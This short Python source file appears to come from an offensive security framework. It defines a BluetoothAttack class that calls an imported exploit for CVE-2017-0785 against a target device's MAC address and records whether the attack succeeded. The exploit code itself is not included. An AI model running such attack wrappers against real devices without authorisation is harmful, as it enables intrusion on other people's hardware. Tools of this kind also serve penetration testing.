#!/usr/bin/env python
# -*- coding: utf-8 -*-

import re
from masai.utils.process import Process
from masai.model.bluetoothattackresult import BluetoothAttackResult
from masai.tools.cve_2017_0785 import exploit

class BluetoothAttack(object):
    
    def __init__(self, target_device):
        self.target_device = target_device

    def run(self):
        result = BluetoothAttackResult()
        mac = self.target_device.mac
        status = exploit(mac)
        print(status)
        if status:
            status = "success"
        else:
            status = "failure"
        result.set_result(target_bluetooth_device=self.target_device, status=status)        
        return result